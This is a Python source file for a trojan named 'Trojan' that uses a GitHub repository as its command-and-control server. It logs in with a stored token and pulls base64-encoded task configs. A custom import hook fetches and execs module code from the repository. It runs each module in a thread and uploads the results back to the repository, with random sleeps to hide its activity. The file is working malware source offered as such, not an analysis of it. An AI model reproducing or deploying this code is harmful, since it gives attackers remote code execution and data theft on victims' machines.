import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

# Function to connect to a GitHub repository using a token stored in a local file
def github_connect():
    with open('secret.txt') as f:
        token=f.read().strip()
    user = 'smallestbird'
    sess=github3.login(token=token)
    return sess.repository(user,'Trojan')
# Function to retrieve the contents of a file from a specific directory in the GitHub repository
def get_file_contents(dirname,module_name,repo):
    return repo.file_contents(f'{dirname}/{module_name}').content
# Class representing the Trojan
class Trojan:
    def __init__(self,id):
        self.id=id
        self.config_file=f'{id}.json'
        self.data_path=f'data/{id}/'
        self.repo=github_connect()
    def get_config(self):
        config_json=get_file_contents('config',self.config_file,self.repo)
        config=json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config
    # Method to run a specific module from the configuration
    def module_runner(self,module):
        result=sys.modules[module].run()
        self.store_module_result(result)
    # Method to store the result of a module execution in the GitHub repository
    def store_module_result(self,data):
        message=datetime.now().isoformat()
        remote_path=f'data/{self.id}/{message}.data'
        bindata=base64.b64encode(bytes('%r'%data,'utf-8'))
        self.repo.create_file(remote_path,message,bindata)
    # Main method to run the Trojan
    def run(self):
        while True:
            config =self.get_config()
            for task in config:
                thread=threading.Thread(target=self.module_runner,args=(task['module'],))
                thread.start()
                # rand sleep time from 1 to 10 secs
                time.sleep(random.randint(1,10))
            # Random sleep time between 30 minutes to 3 hours before repeating the process
            time.sleep(random.randint(30*60,3*60*60))
# Class to dynamically import Python modules from the GitHub repository
class GitImporter:
    def __init__(self):
        self.current_module_code=""
    # Method to find and load the module
    def find_spec(self,fullname,path,target=None):
        print(f"[*] attempting to {fullname}")
        self.repo=github_connect()
        try:
            # Retrieve the module code from the 'modules' directory
            new_library=get_file_contents('modules',f'{fullname}.py',self.repo)
            if new_library is not None:
                self.current_module_code=base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname,loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] module {fullname} not found in repo")
            return None
    # Method to create the module (not used, hence returns None)
    def create_module(self,spec):
        return None
    # Method to execute the module code
    def exec_module(self,module):
        exec(self.current_module_code,module.__dict__)
    
# main section of script
if __name__=='__main__':
    sys.meta_path.append(GitImporter())
    trojan=Trojan('abc')
    trojan.run()





    

            
